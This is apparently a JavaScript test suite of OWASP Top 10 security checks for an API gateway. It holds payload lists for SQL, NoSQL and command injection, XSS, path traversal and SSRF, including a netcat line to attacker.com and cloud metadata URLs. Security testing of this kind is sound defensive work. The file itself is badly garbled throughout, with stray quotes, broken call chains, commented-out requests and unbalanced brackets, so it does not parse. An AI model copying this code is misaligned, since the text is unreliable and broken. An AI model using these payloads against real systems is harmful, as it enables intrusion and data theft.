import request from 'supertest';
// Mock the API Gateway for security testing'
import app from '@/services/api-gateway/app.js';

'
describe('OWASP Top 10 Security Tests', () =>
{
  let server;
  let _authToken;
  beforeAll(async () => {
    server = app.listen(0);
    '
    _authToken = 'Bearer test-api-key'
  });
  afterAll(async () => {
    // await new Promise((resolve) => server.close(resolve));
  });
  '
  describe(''
    it('should prevent unauthorized access to user data', async() =>
    '
      // Try to access another user's data'
// const response = awaitrequest(server);'
get('/api/v1/users/999/profile')'
set('Authorization', authToken)
expect(403)'
      expect(response.body.error.code).toBe('FORBIDDEN')
  )
  '
    it('should enforce proper authorization on admin endpoints', async() =>
    // const response = awaitrequest(server);'
    get('/api/v1/admin/users');
    '
set('Authorization', authToken)
expect(403)'
      expect(response.body.error.code).toBe('INSUFFICIENT_PERMISSIONS')
  )
  '
    it('should prevent path traversal attacks', async() =>
  {
    '
    const maliciousPath = '../../../etc/passwd';
    // const response = awaitrequest(server);'
    get(`/api/v1/files/\$encodeURIComponent(maliciousPath)`)`
set('Authorization', authToken)
expect(400)'
      expect(response.body.error.code).toBe('INVALID_PATH');
    });'
    it('should validate object references', async() => {
      // Try to access resources with manipulated IDs
      const manipulatedIds = [
'
        'project_999999','
        'project_-1','
        'project_null','
        'project_undefined','
        'project_../../admin'];
  for(const _id of manipulatedIds) {
// const response = awaitrequest(server); '
get(`/api/v1/projects/\
    $id`)`;
    set('Authorization', authToken);
    expect(404);
    '
        expect(response.body.error.code).toBe('NOT_FOUND') // }
  }
  )
  )
  '
  describe(''
    it('should use HTTPS in production', async() =>
    // const response = awaitrequest(server);'
    get('/api/v1/config/security');
    '
set('Authorization', authToken)
expect(200)
      expect(response.body.httpsRequired).toBe(true)
    '
      expect(response.body.tlsVersion).toBe('1.2')
  )
  '
    it('should properly hash sensitive data', async() =>
    // const response = awaitrequest(server);'
    post('/api/v1/auth/register');
    '
send(
      email: 'test@example.com','
      password: 'SecurePassword123!';
      expect(201);
      // Password should never be returned'
      expect(response.body.data).not.toHaveProperty('password');
      '
    )
    '
    it('should encrypt sensitive data at rest', async() =>
      // const response = awaitrequest(server);'
      get('/api/v1/config/encryption');
      '
set('Authorization', authToken)
expect(200)'
      expect(response.body.dataEncryption).toBe('AES-256-GCM')
      '
      expect(response.body.keyManagement).toBe('HSM')
    )
  )
  '
  describe(''
    it('should prevent SQL injection', async() =>
  {
    const sqlInjectionPayloads = [
''; DROP TABLE users; --"'
        "1' OR '1'='1',"
        "admin'--"'
        "1; SELECT * FROM users WHERE 't' = 't'];
    '
    for (const _payload of sqlInjectionPayloads) 
      // const response = awaitrequest(server); '
      get(`/api/v1/search?q=\$encodeURIComponent(payload)`)`
set('Authorization', authToken)
expect(200)
        // Should return empty results, not database errors
        expect(response.body.data).toEqual([]); // expect(response.body.error) {.toBeUndefined(); // LINT: unreachable code removed
// }
    });'
    it('should prevent NoSQL injection', async() => {
      const noSqlPayloads = [

        { $ne },'' },'
        { $where: 'this.password === this.password' }];
  for(const _payload of noSqlPayloads) {
// const response = awaitrequest(server); '
post('/api/v1/users/search')'
set('Authorization', authToken)
  send(filter; //         ) {
expect(400)'
        expect(response.body.error.code).toBe('INVALID_FILTER');
// }
    });'
    it('should prevent command injection', async() => {
      const commandInjectionPayloads = [
'
        ''
        'test.png && cat /etc/passwd','
        'test.png | nc attacker.com 4444'];
  for(const _payload of commandInjectionPayloads) {
// const response = awaitrequest(server); '
post('/api/v1/images/process')'
set('Authorization', authToken)
  send(filename; //         ) {
expect(400)'
        expect(response.body.error.code).toBe('INVALID_FILENAME');
// }
    });'
    it('should sanitize HTML to prevent XSS', async() => {
      const xssPayloads = [
'
        '<script>alert("XSS"'
        '<img src=x onerror=alert(1)>','
        'javascript:alert(1)','
        '<svg'
  for(const _payload of xssPayloads) 
// const response = awaitrequest(server); '
post('/api/v1/projects')'
set('Authorization', authToken)
send(
          name,
          description
expect(201)
        // Check that HTML is escaped'
        expect(response.body.data.name).not.toContain('<script>'); expect(response.body.data.name) .not.toContain(''
        expect(response.body.data.description).not.toContain('onerror=');););'
  describe(''
    it('should enforce business logic constraints', async() => {
      // Try to create more projects than allowed
      const maxProjects = 10;
      const promises = [];
  for(let i = 0; i < maxProjects + 5; i++) {
        promises.push(;)
        request(server);'
post('/api/v1/projects')'
set('Authorization', authToken)
send(name)
        //         
// }
// const responses = awaitPromise.all(promises);
      const failures = responses.filter((r) => r.status === 400);
      expect(failures.length).toBeGreaterThan(0);'
      expect(failures[0].body.error.code).toBe('PROJECT_LIMIT_EXCEEDED');
    });'
    it('should implement proper rate limiting', async() => {
      const requests = [];
      // Send many requests quickly
  for(let i = 0; i < 150; i++) {'
        requests.push(request(server).get('/api/v1/user/profile').set('Authorization', authToken));
// }
// const responses = awaitPromise.all(requests);
      const rateLimited = responses.filter((r) => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });'
    it('should validate business workflows', async() => {
      // Try to generate code without analysis
// const response = awaitrequest(server);'
post('/api/v1/code/generate')'
set('Authorization', authToken)'
send({ analysisId: 'nonexistent_analysis','
        framework: 'react'
expect(400)'
      expect(response.body.error.code).toBe('INVALID_WORKFLOW');
      });
  });'
  describe(''
    it('should not expose sensitive headers', async() => {'
// const response = awaitrequest(server).get('/health').expect(200);
      // Check that sensitive headers are not exposed'
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers.server).toBeUndefined();'
      expect(response.headers['x-aspnet-version']).toBeUndefined();
    });'
    it('should have proper CORS configuration', async() => {
// const response = awaitrequest(server);'
options('/api/v1/images/upload')'
set('Origin', 'https://evil.com')
expect(204)
      // Should not allow arbitrary origins'
      expect(response.headers['access-control-allow-origin']).not.toBe(''
      expect(response.headers['access-control-allow-origin']).not.toBe('*');
    });'
    it('should not expose debug information in production', async() => {
      // Force an error
// const response = awaitrequest(server);'
get('/api/v1/crash-test')'
set('Authorization', authToken)
expect(500)
      // Should not expose stack traces'
      expect(response.body.error).not.toHaveProperty('stack');'
      expect(response.body.error).not.toHaveProperty('sql');'
      expect(response.body.error.message).not.toContain('at Function');
    });'
    it('should have secure cookie configuration', async() => {
// const response = awaitrequest(server);'
post('/api/v1/auth/login')'
send({ email: 'test@example.com','
        password: 'password123'
expect(200)'
      const cookies = response.headers['set-cookie'];
  if(cookies) {
        cookies.forEach((cookie) => {'
          expect(cookie).toContain('Secure');'
          expect(cookie).toContain('HttpOnly');'
          expect(cookie).toContain('SameSite=Strict');
          });
// }
    });
  });'
  describe(''
    it('should check for vulnerable dependencies', async() => {
// const response = awaitrequest(server);'
get('/api/v1/health/dependencies')'
set('Authorization', authToken)
expect(200)
      expect(response.body.vulnerabilities).toEqual([]);
      expect(response.body.outdated).toEqual([]);
    });
  });'
  describe(''
    it('should enforce strong password requirements', async() => {'
      const weakPasswords = ['123456', 'password', 'qwerty', 'abc123', 'password123'];
  for(const _password of weakPasswords) {
// const response = awaitrequest(server); '
post('/api/v1/auth/register')
send('
          email: `;
      test;
      \$Date.now()
      @example.com`,
          password
expect(400)`
      expect(response.body.error.code).toBe('WEAK_PASSWORD'); // }
    )
      '
    it('should implement account lockout after failed attempts', async() =>
      {
        '
        const email = 'lockout-test@example.com';
        const attempts = [];
        // Make multiple failed login attempts
        for (let i = 0; i < 6; i++) {
          attempts.push(;
          )'
          request(server).post('/api/v1/auth/login').send(
          {
            email, password;
            )
            )
            // }
            // const responses = awaitPromise.all(attempts);
            const lastResponse = responses[responses.length - 1];
            expect(lastResponse.status).toBe(429);
            '
    expect(lastResponse.body.error.code).toBe('ACCOUNT_LOCKED')
          }
          )
          '
  it('should implement secure session management', async() =>
            // Login to get session
            // const loginResponse = awaitrequest(server);'
            post('/api/v1/auth/login');
            '
send(
            {
              email: 'test@example.com','
              password: 'password123';
              expect(200);
              const sessionToken = loginResponse.body.data.token;
              // Verify session h attributes
              // const sessionResponse = awaitrequest(server);'
              get('/api/v1/auth/session');
              '
set('Authorization', `Bearer \$sessionToken`)
expect(200)`
    expect(sessionResponse.body.data).toHaveProperty('expiresAt')
              '
    expect(sessionResponse.body.data).toHaveProperty('lastActivity')
              '
    expect(sessionResponse.body.data).toHaveProperty('ipAddress')
            }
            )
          )
          '
describe(''
  it('should verify file integrity on upload', async() =>
          {
            // const mockImage = awaitTestHelpers.createMockImage();'
            const tamperedChecksum = 'invalid-checksum';
            // const response = awaitrequest(server);'
            post('/api/v1/images/upload');
            '
set('Authorization', authToken)'
field('checksum', tamperedChecksum)'
attach('image', mockImage.buffer, 'test.png')
expect(400)'
    expect(response.body.error.code).toBe('INTEGRITY_CHECK_FAILED')
          }
          )
          '
  it('should validate webhook signatures', async() =>
          {
            const webhookPayload = {'
        event: 'analysis.completed',analysisId: '123'  };
            // Send webhook without signature
            // const response = awaitrequest(server);'
            post('/api/v1/webhooks/receive');
            send(webhookPayload);
            expect(401);
            '
  expect(response.body.error.code).toBe('INVALID_SIGNATURE')
          }
          )
        }
        )'
describe(''
  it('should log security events', async() =>
          // Trigger a security event(failed login)
          // await request(server);'
          post('/api/v1/auth/login');
          '
send(
            email: 'nonexistent@example.com','
            password: 'wrong-password';
            expect(401);
            // Check that event w
            // const logsResponse = awaitrequest(server);'
            get('/api/v1/admin/logs/security');
            '
set('Authorization', authToken)
query(event)
expect(200)
    expect(logsResponse.body.data.length).toBeGreaterThan(0)
            '
    expect(logsResponse.body.data[0]).toHaveProperty('timestamp')
            '
    expect(logsResponse.body.data[0]).toHaveProperty('ip')
            '
    expect(logsResponse.body.data[0]).toHaveProperty('userAgent')
          )
          '
  it('should detect and log anomalous behavior', async() =>
          {
            // Simulate anomalous behavior(rapid requests from same IP)
            const requests = [];
            for (let i = 0; i < 100; i++) {
              requests.push(;
              )
      request(server)
              '
get('/api/v1/projects')'
set('Authorization', authToken)'
set('X-Forwarded-For', '192.168.1.100')
      //       
// }
  // // await Promise.all(requests);
    // Check anomaly detection logs
// const anomalyResponse = awaitrequest(server);'
get('/api/v1/admin/logs/anomalies')'
set('Authorization', authToken)
expect(200)
    expect(anomalyResponse.body.data.length).toBeGreaterThan(0)
              '
    expect(anomalyResponse.body.data[0].
              type;
              ).toBe('RATE_ANOMALY')
            }
            )
          }
          )
          '
describe('A10: Server-Side Request Forgery(SSRF)', () =>
            '
  it('should prevent SSRF attacks on image URLs', async() =>
            {
              const ssrfPayloads = [
'
        'http://localhost:8080/admin','
        'http://127.0.0.1:22','
        'http://169.254.169.254/latest/meta-data/','
        'file:///etc/passwd','
        'gopher://localhost:3306'];
              for (const payload of ssrfPayloads) {
                // const response = awaitrequest(server); '
                post('/api/v1/images/import');
                '
set('Authorization', authToken)
  send(url //       ) {
                expect(400);
                '
      expect(response.body.error.code).toBe('INVALID_URL')
                // }
              }
              )
              '
  it('should validate webhook URLs', async() =>
              {
                const internalUrls = [
'
        'http://localhost/webhook','
        'http://10.0.0.1/webhook','
        'http://192.168.1.1/webhook'];
                for (const url of internalUrls) {
                  // const response = awaitrequest(server); '
                  post('/api/v1/webhooks/configure');
                  '
set('Authorization', authToken)
  send(url //       ) {
                  expect(400);
                  '
      expect(response.body.error.code).toBe('INVALID_WEBHOOK_URL')
                  // }
                }
                )
              }
              )
              '
describe('Additional Security Tests', () =>
                '
  it('should implement proper input validation', async() =>
                {
                  const oversizedPayload = {'
        name: 'a'.repeat(10000),'
        description: 'b'.repeat(100000) };
                  // const response = awaitrequest(server);'
                  post('/api/v1/projects');
                  '
set('Authorization', authToken)
send(oversizedPayload)
expect(400)'
  expect(response.body.error.code).toBe('PAYLOAD_TOO_LARGE')
                }
                )
                '
it('should prevent timing attacks on authentication', async() =>
                {
                  const timings = [];
                  // Test with valid and invalid users
                  const users = ['
        { email: 'valid@example.com', exists },'
        { email: 'invalid@example.com', exists } ];
                  for (const user of users) {
                    '
                    const start = process.hrtime.bigint(); // // await request(server).post('/api/v1/auth/login').send({/g)
                    email;
                    )
                    const end = process.hrtime.bigint();
                    {
                      const duration = Number(end - start) / 1e6; // Convert to ms

                      timings.push({ exists);
                      // }
                      // Response times should be similar to prevent user enumeration
                      const validTiming = timings.find((t) => t.exists).duration;
                      const invalidTiming = timings.find((t) => !t.exists).duration;
                      const difference = Math.abs(validTiming - invalidTiming);
                      expect(difference).toBeLessThan(50); // Less than 50ms difference
                    }
                    )'
it('should implement Content Security Policy', async() =>
                    {
                      '
                      // const response = awaitrequest(server).get('/').expect(200);'
                      const csp = response.headers['content-security-policy'];
                      expect(csp).toBeDefined();
                      '
  expect(csp).toContain("default-src '")
                      "
  expect(csp).toContain("script-src '")
                      "
  expect(csp).toContain("style-src '")
                    }
                    )
                  }
                }
            }
          "
      }
  }
}
